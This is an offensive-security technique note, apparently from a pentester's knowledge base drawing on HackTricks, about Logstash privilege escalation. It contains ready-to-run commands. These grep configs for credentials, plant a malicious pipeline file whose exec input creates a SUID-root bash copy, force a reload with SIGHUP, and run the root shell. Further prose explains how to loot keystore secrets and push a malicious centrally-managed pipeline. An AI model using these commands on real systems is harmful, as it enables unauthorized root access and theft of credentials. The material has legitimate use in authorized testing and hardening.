---
title: "Logstash Privilege Escalation"
type: technique
tags: [linux, logstash, elastic, privilege-escalation]
phase: privilege-escalation
date_created: 2026-07-15
date_updated: 2026-07-15
sources: [hacktricks-linux]
---

# Logstash Privilege Escalation

Logstash runs pipelines (input -> filter -> output), usually as the `logstash` user. If you can write a pipeline `.conf` (or write into a wildcard-globbed config dir) AND either restart the service or `config.reload.automatic: true` is set, the `exec` input gives command execution on every interval.

## Enumerate first

```bash
ps aux | grep -i logstash; systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml /etc/logstash/logstash.yml 2>/dev/null
curl -s http://127.0.0.1:9600/_node/pipelines?pretty   # confirm loaded pipelines
rg -n -S 'password|api[_-]?key|cloud_auth|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```

## SUID-drop payload via exec input

Durable SUID-drop payload (better than a transient reverse shell), plus a signal-based reload when you lack restart rights:

```bash
cat > /etc/logstash/conf.d/zzz-pwn.conf <<'EOF'
input { exec { command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot" interval => 120 } }
output { null {} }
EOF
kill -SIGHUP $(pgrep -f logstash)   # triggers a config reload on Unix
/tmp/logroot -p                     # after it fires
```

## Notes, secrets looting, and centralized pipelines

`exec` forks the JVM (can `ENOMEM` under memory pressure); the `stdin` input blocks auto-reload, so don't assume reload always applies; `-f <dir>` concatenates all files lexicographically, so a `000-` or `zzz-` drop reshapes the assembled pipeline. Loot secrets first: plaintext creds in `elasticsearch{}`/JDBC/`http_poller` blocks, the keystore at `/etc/logstash/logstash.keystore` (password often in `LOGSTASH_KEYSTORE_PASS` sourced from `/etc/sysconfig/logstash`), the process environ, and old logs (`journalctl -u logstash`; CVE-2023-46672 logged secrets). Recovered creds usually unlock Elasticsearch. If `xpack.management.enabled: true`, local `.conf` files are NOT the source of truth: with an Elastic account holding `manage_logstash_pipelines`, PUT a malicious centrally-managed pipeline (`_logstash/pipeline/<id>`) that the host executes on its next poll, even when local files are read-only.

## Sources

- HackTricks linux-hardening (ingest slug `hacktricks-linux`).
